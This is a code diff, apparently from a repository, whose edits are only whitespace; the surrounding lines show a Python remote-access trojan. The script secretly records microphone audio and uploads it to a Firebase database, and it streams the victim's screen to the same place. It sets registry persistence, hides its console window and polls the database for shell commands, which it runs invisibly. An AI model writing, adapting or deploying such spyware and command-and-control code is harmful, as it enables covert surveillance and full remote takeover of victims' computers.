@@ -14,7 +14,6 @@ from scipy.io.wavfile import write
 from io import BytesIO
 
 DB_BASE_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE"
-
 def record_audio(duration=10):
     try:
         fs = 16000  
@@ -26,7 +25,6 @@ def record_audio(duration=10):
         requests.put(f"{DB_BASE_URL}/audio_data.json", json={"audio": audio_base})
     except:
         pass
-
 def make_persistent():
     try:
         appdata = os.getenv('APPDATA')
@@ -41,7 +39,6 @@ def make_persistent():
             subprocess.Popen(reg_cmd, shell=True, creationflags=0x08000000)
     except:
         pass
-
 def stream_screen():
     screen_url = f"{DB_BASE_URL}/live_screen.json"
     while True:
@@ -54,7 +51,6 @@ def stream_screen():
             time.sleep(2)
         except:
             time.sleep(5)
-
 def hide_console():
     hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
     if hWnd:
@@ -72,16 +68,13 @@ def execute_command(command):
         subprocess.Popen(command, shell=True, creationflags=0x08000000)
     except:
         pass
-
 def start_gateway():
     make_persistent()
     threading.Thread(target=stream_screen, daemon=True).start()
     time.sleep(5)
-    hide_console()   
-    
+    hide_console()
     cmd_url = f"{DB_BASE_URL}/current_command.json"
-    last_ts = 0
-    
+    last_ts = 0  
     while True:
         try:
             response = requests.get(cmd_url)
@@ -105,6 +98,5 @@ def start_gateway():
         except:
             pass
         time.sleep(1)
-
 if __name__ == "__main__":
     start_gateway()
